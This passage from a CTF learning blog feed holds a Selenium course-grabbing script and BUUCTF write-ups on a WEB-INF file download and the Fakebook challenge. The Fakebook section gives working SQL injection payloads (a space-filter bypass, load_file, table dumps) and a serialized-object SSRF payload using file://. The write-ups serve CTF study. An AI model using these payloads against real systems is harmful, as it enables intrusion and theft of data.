秒钟，如果在这段时间内没有找到警告框，将会抛出一个 TimeoutException。</li><li><code>.until(EC.alert_is_present())</code>  调用了 until 方法，并传入了一个 ExpectedCondition，即 EC.alert_is_present ()。这个 ExpectedCondition 会持续检查浏览器是否出现了一个警告框，直到它出现或者等待时间超时为止。</li></ul><p>因此，这行代码的作用是等待最多 5 秒钟，直到浏览器中出现一个警告框为止。</p><p>添加完注释的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By <span class="comment">#提供了一系列用于定位元素的方法，可以通过不同的方式（如ID、类名、XPath等）来定位页面上的元素</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait <span class="comment">#用于实现等待页面元素加载完成或特定条件满足的功能。通过使用WebDriverWait类，可以在自动化测试脚本中添加显式等待</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC    <span class="comment">#用于配合WebDriverWait类进行等待操作。这些条件可以用于等待页面上的某些特定状态或事件发生，如元素可见、元素存在、元素包含特定文本等。</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;http://106.14.57.14:31446/&quot;</span>)</span><br><span class="line">sleep(<span class="number">3</span>)    <span class="comment">#等待页面完全加载</span></span><br><span class="line"></span><br><span class="line">courses_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据网页的html就是f12的查看器里的内容来获取课程的列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):   </span><br><span class="line">    course = &#123;</span><br><span class="line">        <span class="string">&#x27;panel&#x27;</span>:<span class="string">f&#x27;//*[@id=&quot;selector-container&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[1]&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;status&#x27;</span>:<span class="string">f&#x27;//*[@id=&quot;selector-container&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[5]&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>:<span class="string">f&#x27;//*[@id=&quot;selector-container&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[6]/button&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    courses_list.append(course)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(courses_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> courses_list:</span><br><span class="line">    driver.refresh()    <span class="comment">#网页刷新</span></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> course <span class="keyword">in</span> courses_list:</span><br><span class="line">        panel = driver.find_element(By.XPATH, course[<span class="string">&#x27;panel&#x27;</span>])  <span class="comment">#查找页面上符合指定XPath表达式的第一个元素</span></span><br><span class="line">        panel.click()   <span class="comment">#点击面板（页面加载完成后所有课程都是收起来的，需要点击展开）</span></span><br><span class="line">        status_element = driver.find_element(By.XPATH, course[<span class="string">&#x27;status&#x27;</span>])</span><br><span class="line">        status_text = status_element.text   <span class="comment">#获取XPATH路径相关内容，用来判断课程是不是满的，作为能不能进行下列抢课操作的前提</span></span><br><span class="line">        <span class="built_in">print</span>(status_text)</span><br><span class="line">        <span class="keyword">if</span> status_text != <span class="string">&quot;已满&quot;</span>:</span><br><span class="line">            submit_button = driver.find_element(By.XPATH, course[<span class="string">&#x27;submit&#x27;</span>])</span><br><span class="line">            submit_button.click()</span><br><span class="line">            WebDriverWait(driver, <span class="number">5</span>).until(EC.alert_is_present())   <span class="comment">#见上文</span></span><br><span class="line">            alert = driver.switch_to.alert  <span class="comment">#这种操作是在页面上出现警告框时使用的，以便对警告框进行处理，比如接受或取消警告，获取警告文本等</span></span><br><span class="line"></span><br><span class="line">            alert.accept()  <span class="comment">#应该是抢课成功接受alert弹窗</span></span><br><span class="line">            courses_list.remove(course) <span class="comment">#从需要抢课的列表中删除已抢到的课</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">driver.quit()   <span class="comment">#关闭浏览器</span></span><br></pre></td></tr></table></figure><p>运行脚本等待所有的课都选完，打开靶机 url，点击选完了，就能得到 flag</p><p>hgame<ruby>w0W_!_1E4Rn_To_u5e_5cripT_<rp>【</rp><rt>_^</rt><rp>】</rp></ruby></p><h2 id="ezhttp"><a class="markdownIt-Anchor" href="#ezhttp">#</a> ezHTTP</h2><p>这里顺带记录一下 ezHTTP 新学到的东西：</p><p>XFF 在这题被禁用了，不能用 XFF 和 Client-ip，可以用 X-Real-IP 尝试一下</p><p>这里就是使用 X-Real-IP 就可以了</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;select-courses&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#select-courses&quot;&gt;#&lt;/a&gt; Select Courses&lt;/h2&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://dr4x3zz.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://dr4x3zz.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题3</title>
    <link href="https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/"/>
    <id>https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/</id>
    <published>2024-01-27T08:26:08.000Z</published>
    <updated>2024-10-14T09:52:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="roarctf-2019easy-java"><a class="markdownIt-Anchor" href="#roarctf-2019easy-java">#</a> [RoarCTF 2019]Easy Java</h2><span id="more"></span><p>学习链接：<a href="https://blog.csdn.net/xhy18634297976/article/details/123117897">https://blog.csdn.net/xhy18634297976/article/details/123117897</a></p><p>点击 help</p><blockquote help.docx><p>java.io.FileNotFoundException:</p></blockquote><p>这里记录一下 Servlet 和 WEB-INF</p><blockquote><p>Servlet</p><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a01.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>具体的可以看：<a href="https://www.runoob.com/servlet/servlet-intro.html">https://www.runoob.com/servlet/servlet-intro.html</a></p><p>WEB-INF</p><p>WEB-INF 是 java 的 WEB 应用的安全目录。</p><p>1、WEB-INF/web.xml</p><p>web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p><p>2、WEB-INF/classes</p><p>包含了站点所有有用的 class 文件，包括 servlet class 和非 servlet class。</p><p>3、WEB-INF/lib</p><p>存放 web 应用需要的 JAR 文件。</p><p>4、WEB-INF/src</p><p>源码目录，按照包名结构放置各个 java 文件。</p><p>5、WEB-INF/database.properties</p><p>数据库配置文件。</p><p>6、WEB-INF/tags</p><p>存放了自定义标签文件。</p><p>7、WEB-INF/jsp</p><p>jsp1.2 以下版本的文件存放位置。</p><p>8、WEB-INF/jsp2</p><p>存放 jsp2.0 以下版本的文件。</p><p>9、META-INF</p><p>相当于一个信息包。</p></blockquote><p>漏洞形成原因：</p><p>Tomcat 的 WEB-INF 目录，每个 j2ee 的 web 应用部署文件默认包含这个目录。（对于 j2ee 可以看这个博客：<a href="https://blog.csdn.net/youtufeitu/article/details/124891927?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170636067716800192265035%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170636067716800192265035&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2">https://blog.csdn.net/youtufeitu/article/details/124891927?ops_request_misc=%7B%22request%5Fid%22%3A%22170636067716800192265035%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=170636067716800192265035&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</a><sub>all</sub>top_positive~default-1-124891927-null-null.142<sup>v99</sup>pc_search_result_base7&amp;utm_term=j2ee&amp;spm=1018.2226.3001.4187）</p><p>Nginx 在映射静态文件时，把 WEB-INF 目录映射进去，而又没有做 Nginx 的相关安全配置（或 Nginx 自身一些缺陷影响）。从而导致通过 Nginx 访问到 Tomcat 的 WEB-INF 目录（请注意这里，是通过 Nginx，而不是 Tomcat 访问到的，因为上面已经说到，Tomcat 是禁止访问这个目录的。）。</p><p>这里对 Nginx 和 Tomcat 的关系也做一点记录：</p><blockquote><p>nginx 在负载均衡里是前端服务器，用来处理请求的转发（反向代理等）；是静态页面服务器。绝大部分时候他们本身并不会运行项目.</p><p>Tomcat 是后端服务器，属于 Java Servlet 容器。用来生成动态页面。是直接用来运行项目的容器。简单来说就是你发出一个请求，先经过 nginx, 它们会合理地把请求分配到后台比较不忙的 Tomcat.Tomcat 会把请求处理好返回给 Nginx, 然后 Nginx 会把最终的结果传送给浏览器。当然，如果是一些静态的数据，Nginx 就可以直接处理了。</p></blockquote><p>漏洞利用方式：</p><p>直接在域名后面加上 WEB-INF/web.xml 就可以了。根据 web.xml 配置文件路径或通常开发时常用框架命名习惯，找到其他配置文件或类文件路径。dump class 文件进行反编译。通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。</p><p>上面的解释我大部分都是直接照搬的，通过大佬的解释应该是获取 web.xml 文件</p><p>跟着 wp 走</p><p>这里抓包把 get 改成 post</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a02.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>看到 com.wm.ctf.FlagController，试着下载 FlagController.class</p><p>构建 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a03.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到有一串 base64 加密的内容，解码发现就是 flag</p><p f39b749f-41bf-45b9-b915-44766f763c92>flag</p><p>flag 拿的挺懵的，对 java 的内容还是接触不多，payload 的构建也是不太懂</p><h2 id="网鼎杯-2018fakebook"><a class="markdownIt-Anchor" href="#网鼎杯-2018fakebook">#</a> [网鼎杯 2018] Fakebook</h2><p>学习链接：<a href="https://blog.csdn.net/qq_58784379/article/details/120548225">https://blog.csdn.net/qq_58784379/article/details/120548225</a></p><p>先用 dirsearch 扫描一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://8d8f949c-e060-4a7c-9ebf-de266c4a5bef.node5.buuoj.cn:81/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a04.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到存在 robots.txt，访问一下</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a05.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>下载下来，打开可以看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计</p><p>构造了一个 UserInfo 类，有三个属性，分别是 name、age 和 blog</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过 get 获取 url，设置 curl 参数，将指定的 url 内容返回，内容不是 404 就可以返回</p><blockquote><p><code>curl_setopt (int ch, string option, mixed value)</code></p><p>curl_setopt () 函数将为一个 CURL 会话设置选项。option 参数是你想要的设置，value 是这个选项给定的值。</p><p><code>curl_getinfo()</code>  —— 获取一个 cURL 连接资源句柄的信息</p></blockquote><p>最后还对 blog 正则匹配</p><p>回到题目，先注册一下看看</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a06.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>注册完后可以发现 admin 是可以点击的</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a07.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>点击进去查看网页源代码发现他是可以回显 blog 里的内容</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a08.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这个 base64 解码之后会发现很多百度相关的元素，比如百度一下，你就知道这种 title，这个 src 用的是 data 协议，在做 php 伪协议的题目也有用来读取 flag</p><p>仔细看 url，其实可以发现类似 sql 注入常用的 id 参数，这里是 no</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://781fc949-b9d2-4223-9f55-8d9fed53a21a.node5.buuoj.cn:81/view.php?no=1</span><br></pre></td></tr></table></figure><p>尝试一下 sql 注入</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a09.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>加个单引号可以发现有回显错误</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a10.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>发现本题不需要再去闭合符号，order by 查字段数，在查询到 5 的时候出错了，说明有 4 个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0 order by 5#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a11.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a12.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>用联合注入看看回显字段，用 /**/ 替换空格，不替换的话会显示 <code>no hack ~_~</code></p><p><code>/**/</code>  可以绕过检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,2,3,4#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a13.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>回显字段是 2，获取当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,database(),3,4#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a14.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查询用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,user(),3,4#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a21.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><strong>解法 1：</strong></p><p>mysql 中的 load_file () 函数可以访问系统内任意文件，可以将内容以字符串形式返回，而且不用很高的权限，但是需要绝对路径，绝对路径在扫描的时候是有发现 flag.php 的文件，而且上面在尝试 sql 注入的时候是有发现绝对路径 <code>/var/www/html/view.php</code> ，flag.php 在扫描的时候发现适合 view.php 同一个目录下，所以 flag.php 的绝对路径应该就是 <code>/var/www/html/flag.php</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,load_file(&quot;/var/www/html/flag.php&quot;),3,4#</span><br></pre></td></tr></table></figure><p>查看源码</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a22.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p eb9fe07c-caaf-49e4-9eea-693ce10b8514>拿到 flag，flag</p><p><strong>解法 2：</strong></p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;fakebook&#x27;#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a15.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>表名 users</p><p>爆字段</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a16.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到四个字段名 no,username,passwd,data</p><p>爆出 username,passwd,data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,group_concat(username,passwd,data),3,4/**/from/**/users#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a17.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>data 内容为 <code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;</code></p><p>这是一个 UserInfo 对象序列化后，如果 select 把这个内容传回去会出现什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;&#x27;from users#</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a18.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/a18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>直接是回显了 blog 的内容，尝试构造一个反序列化的内容去获取 flag，在扫描的时候是有发现 flag.php 的文件，而且上面在尝试 sql 注入的时候是有发现绝对路径 <code>/var/www/html/view.php</code> ，flag.php 在扫描的时候发现适合 view.php 同一个目录下</p><p>payload（注意 s 后面的数字是 29，改了参数大小不能不改）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=0/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;from users#</span><br></pre></td></tr></table></figure><p>f12 查看内容，base64 解码</p><p><img 